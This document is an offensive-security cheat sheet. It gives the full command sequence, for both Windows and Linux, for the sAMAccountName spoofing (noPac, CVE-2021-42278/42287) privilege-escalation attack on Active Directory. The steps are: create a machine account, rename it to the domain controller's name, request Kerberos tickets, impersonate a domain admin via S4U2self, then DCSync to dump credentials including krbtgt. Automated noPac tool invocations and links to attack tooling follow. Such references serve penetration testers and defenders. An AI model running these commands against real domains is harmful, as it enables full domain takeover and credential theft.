# sAMAccountName spoofing

## Windows

### Add computer account
```
New-MachineAccount -MachineAccount <newComputer> -Password $(ConvertTo-SecureString '<newPassword>' -AsPlainText -Force)
```

### Set serviceprincipalname to empty value
```
Set-DomainObject -Identity <newComputer> -Clear serviceprincipalname
```

### Change sAMAccountName to Domain Controllers name without trailing $
```
Set-MachineAccountAttribute -MachineAccount "<newComputer>" -Value "<dcNo$>" -Attribute samaccountname -Verbose
```

### Request a TGT for new computer account
```
Invoke-Rubeus -Command 'asktgt /user:<dcNo$> /password:<newPassword> /domain:<domain> /dc:<fqdnDc> /nowrap'
```

### Reset the controlled machine account sAMAccountName to its old value
```
Set-MachineAccountAttribute -MachineAccount "<dcNo$>" -Value "<newComputer>" -Attribute samaccountname -Verbose
```

### Obtain a service ticket with S4U2self by presenting the previous TGT
```
Invoke-Rubeus -Command 's4u /self /impersonateuser:<domainAdmin> /altservice:cifs/<fqdnDc> /dc:<fqdnDc> /ptt /ticket:<base64>'
```

### Dcsync
```
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:<domain> /kdc:<fqdnDc> /user:<targetUser>"'
```

### Automatic - receive TGT of vulnerable domain controller
```
.\noPac.exe scan -domain <domain> -user <user> -pass <password>
Invoke-noPAC -Command 'scan -domain <domain> -user <user> -pass <password>'
```

## Linux

### Add computer account
```
impacket-addcomputer -computer-name '<newComputer>' -computer-pass '<newComputerPassword>' -dc-ip <dcIp> '<domain>/<user>:<password>'
```

### Set serviceprincipalname to empty value
```
impacket-addspn -u '<domain>\<user>' -p '<password>' -t '<newComputer>' -dc-ip <dcIp>
```

### Change sAMAccountName to Domain Controllers name without trailing $
```
renameMachine -current-name '<newComputer$>' -new-name '<domainController>' -dc-ip <dcIp> '<domain>/<user>:<password>'
```

### Request a TGT for new computer account
```
impacket-getTGT -dc-ip <dcIp> '<domain>/<domainController>:<newComputerPassword>'
```

### Reset the controlled machine account sAMAccountName to its old value
```
renameMachine -current-name '<domainController>' -new-name '<newComputer$>' -dc-ip <dcIp> '<domain>/<user>:<password>'
```

### Obtain a service ticket with S4U2self by presenting the previous TGT
```
KRB5CCNAME='domainController.ccache' impacket-getST -self -impersonate '<targetAdmin>' -spn 'cifs/<domainController>.<domain>' -k -no-pass -dc-ip <dcIp> '<domain>'/'<domainController>'
```

### Dcsync
```
KRB5CCNAME='<targetAdmin>.ccache' impacket-secretsdump -just-dc-user 'krbtgt' -k -no-pass -dc-ip <dcIp> @<fqdn>
```

### Automatic - receive TGT of vulnerable domain controller
```
python noPac.py <domain>/<user>:<password> -dc-ip <dcIp>
```

### References
* https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html  
* https://github.com/cube0x0/noPac  
* https://github.com/Ridter/noPac  
* https://www.cvedetails.com/cve/CVE-2021-42278  
* https://www.cvedetails.com/cve/CVE-2021-42287  
* https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing  
* https://raw.githubusercontent.com/AdrianVollmer/PowerSploit/master/Recon/PowerView.ps1  
* https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1  
* https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1  
* https://raw.githubusercontent.com/SecureAuthCorp/impacket/b4fbcf9196e9b6098edae0ae7794005d2e138ccd/examples/renameMachine.py  
* https://gist.githubusercontent.com/S3cur3Th1sSh1t/0ed2fb0b5ae485b68cbc50e89581baa6/raw/4f0ab724a11c8984c29097250b1a8263e013d183/Invoke-noPac.ps1

